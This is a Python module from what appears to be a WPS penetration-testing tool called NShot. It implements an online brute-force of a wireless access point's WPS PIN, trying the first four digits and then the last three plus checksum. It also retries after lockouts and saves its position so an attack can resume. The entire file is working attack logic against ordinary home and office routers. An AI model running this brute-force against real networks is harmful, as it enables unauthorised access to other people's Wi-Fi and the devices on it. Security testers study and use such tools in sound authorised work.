#  NShot - WPS penetration testing utility
#  License: GPL-3.0-or-later, see LICENSE.
#  Origin and attribution: see CREDITS.md.
"""Online PIN brute-force.

Walks the PIN space half at a time, asks `Attempt` for one registration at a
time, and keeps its position in the store. A failed transaction is retried a
bounded number of times instead of recursing into the whole walk.
"""

import collections
import statistics
import time

from datetime import datetime

from src import logger
from src.store import DEFAULT_STORE
from src.wps.attempt import WPS_FAIL
from src.wps.generator import WPSpin

# How often one PIN is retried after a failed WPS transaction before moving on.
MAX_TRANSACTION_RETRIES = 3


class BruteforceStatus:
    """Position, timing and progress of the walk."""

    def __init__(self):
        self.START_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.MASK = ''
        self.LAST_ATTEMPT_TIME = time.time()
        self.ATTEMPTS_TIMES = collections.deque(maxlen=15)

        self.COUNTER = 0
        self.STATISTICS_PERIOD = 5

    def displayStatus(self):
        """Print percentage complete and average time per PIN."""
        average_pin_time = statistics.mean(self.ATTEMPTS_TIMES)

        if len(self.MASK) == 4:
            percentage = int(self.MASK) / 11000 * 100
        else:
            percentage = ((10000 / 11000) + (int(self.MASK[4:]) / 11000)) * 100

        logger.info('{:.2f}% complete @ {} ({:.2f} seconds/pin)'.format(
            percentage, self.START_TIME, average_pin_time
        ))

    def registerAttempt(self, mask: str):
        """Record one attempt and print progress every few PINs."""
        current_time = time.time()

        self.MASK = mask
        self.COUNTER += 1
        self.ATTEMPTS_TIMES.append(current_time - self.LAST_ATTEMPT_TIME)
        self.LAST_ATTEMPT_TIME = current_time

        if self.COUNTER == self.STATISTICS_PERIOD:
            self.COUNTER = 0
            self.displayStatus()


class Bruteforce:
    """Drives `Attempt` over the PIN space of one AP."""

    def __init__(self, options, attempt, *, store=None, generator=None):
        self.options = options
        self.attempt = attempt
        self.store = store if store is not None else DEFAULT_STORE
        self.generator = generator or WPSpin()
        self.status = BruteforceStatus()
        self.success = False

    # -- the verb ----------------------------------------------------------

    def run(self, bssid: str, start_pin: str | None = None) -> bool:
        """Brute-force the PIN of `bssid`, resuming from the saved mask."""
        self.success = False

        try:
            mask = self._initial_mask(bssid, start_pin)
            self.status.MASK = mask

            if len(mask) == 4:
                first_half = self._first_half(bssid, mask)
                if first_half and not self.success:
                    self._second_half(bssid, first_half, '001')
            elif len(mask) == 7:
                self._second_half(bssid, mask[:4], mask[4:])
            else:
                logger.error(f'Invalid brute-force mask {mask}: expected 4 or 7 digits')
        except KeyboardInterrupt:
            logger.info('Aborting…')
            if self.options.loop:
                raise
        finally:
            # The walk position is worth keeping in every ending: an abort is
            # exactly the case a resume is for, and the old code relies on the
            # file being there after a finished walk too.
            if self.status.MASK:
                path = self.store.save_mask(bssid, self.status.MASK)
                logger.info(f'Session saved in {path}')

        return self.success

    # -- internals ---------------------------------------------------------

    def _initial_mask(self, bssid: str, start_pin: str | None) -> str:
        """Where to resume: explicit mask, saved mask, or the beginning."""
        if start_pin and len(start_pin) >= 4:
            return start_pin[:7]

        saved = self.store.load_mask(bssid)
        if saved:
            try:
                if input(f'[?] Restore previous session for {bssid}? [n/Y]').lower() != 'n':
                    return saved
            except EOFError:
                return saved
        return '0000'

    def _attempt(self, bssid: str, pin: str):
        """One registration, with a bounded number of transaction retries."""
        result = None
        for retry in range(1, MAX_TRANSACTION_RETRIES + 1):
            result = self.attempt.attempt(bssid, pin)
            self.success = result.ok
            if result.ok:
                return result
            if result.locked:
                logger.warning(
                    f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.options.timeout}s…'
                )
                time.sleep(self.options.timeout)
                continue
            if result.outcome == WPS_FAIL:
                logger.warning('WPS transaction failed, re-trying last pin')
                continue
            return result
        return result

    def _first_half(self, bssid: str, first_half: str) -> str | None:
        """Find the first four digits; returns them once the AP answers M5+."""
        checksum = self.generator.checksum

        while int(first_half) < 10000 and not self.success:
            if not self.attempt.radio.is_up():
                logger.error(
                    f'Interface {self.attempt.interface} is no longer UP. Aborting bruteforce.'
                )
                return None

            pin = f'{first_half}000{checksum(int(first_half + "000"))}'
            result = self._attempt(bssid, pin)

            if self.success:
                return first_half

            if result.locked:
                logger.warning(
                    f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.options.timeout}s…'
                )
                time.sleep(self.options.timeout)
                continue

            if result.first_half_valid:
                logger.info('First half found')
                return first_half

            first_half = str(int(first_half) + 1).zfill(4)
            self.status.registerAttempt(first_half)

            if self.options.delay:
                time.sleep(self.options.delay)

        if not self.success:
            logger.warning('First half not found')
        return None

    def _second_half(self, bssid: str, first_half: str, second_half: str) -> str | None:
        """Walk the last three digits plus checksum for a known first half."""
        checksum = self.generator.checksum

        while int(second_half) < 1000 and not self.success:
            if not self.attempt.radio.is_up():
                logger.error(
                    f'Interface {self.attempt.interface} is no longer UP. Aborting bruteforce.'
                )
                return None

            pin = f'{first_half}{second_half}{checksum(int(first_half + second_half))}'
            result = self._attempt(bssid, pin)

            if self.success:
                return pin

            if result.locked:
                logger.warning(
                    f'{bssid} is WPS LOCKED. Retrying PIN {pin} in {self.options.timeout}s…'
                )
                time.sleep(self.options.timeout)
                continue

            if result.last_message > 6:
                return pin

            second_half = str(int(second_half) + 1).zfill(3)
            self.status.registerAttempt(first_half + second_half)

            if self.options.delay:
                time.sleep(self.options.delay)

        return None